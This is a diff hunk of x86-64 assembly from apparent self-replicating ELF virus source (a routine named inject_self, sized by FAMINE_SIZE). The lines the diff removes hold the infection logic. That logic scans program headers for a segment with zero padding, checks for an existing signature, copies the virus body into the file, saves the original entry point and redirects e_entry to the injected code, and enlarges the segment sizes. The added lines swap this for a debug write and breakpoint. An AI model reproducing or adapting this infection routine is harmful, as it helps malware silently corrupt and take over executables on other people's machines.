@@ -187,52 +187,26 @@ inject_self:
 
 	.segment:
 	cmp rcx, 0
-	jle .return
-	mov rax, SEGMENT_TYPE
-	cmp rax, qword [rdi]
+	jl .return
+	mov ax, SEGMENT_TYPE
+	mov r11w, word [rdi]
+	cmp ax, r11w
 	jnz .next
-	mov rax, qword[rdi + elf64_phdr.p_vaddr]
-	cmp rdx, rax
-	jb .next
-	add rax, qword[rdi + elf64_phdr.p_memsz]
-	mov r13, rax
-	cmp rdx, rax
-	jl .find_space
+	jmp .infect
 
 	.next:
 	add rdi, elf64_phdr_size
 	dec rcx
 	jmp .segment
 
-	.find_space:
+	.infect:
 							;check if availables space in 0s
-	mov rax, qword [rdi + elf64_phdr.p_offset]
-	add rax, qword [rdi + elf64_phdr.p_filesz]
-	lea rdi, [r15 + rax]
-	mov rsi, rdi
-	xor al, al
-	mov rcx, FAMINE_SIZE
-	repz scasb
-	test rcx, rcx
-							;check if already we can find signature already
-	lea rdi, [rel _start]
-	xchg rdi, rsi
-	mov rax, [rel signature]
-	cmp rax, qword [rdi  - (_end - signature)]
-	jz .return
-
-							;infect target
-	mov rcx, FAMINE_SIZE
-	repnz movsb
-							;set ep
-	mov rax, qword[r15 + elf64_ehdr.e_entry]
-	mov qword [rdi - 16], r13
-	mov qword [rdi - 8], rax
-							;edit header
-	mov [r15 + elf64_ehdr.e_entry], r13
-	mov rax, FAMINE_SIZE
-	add qword [r14 + elf64_phdr.p_filesz], rax
-	add qword [r14 + elf64_phdr.p_memsz], rax
+	mov rax, 1
+	mov rdi, 1
+	lea rsi, [infect_dir]
+	mov rdx, 10
+	syscall
+	int3
 
 	.return :
 		pop r15
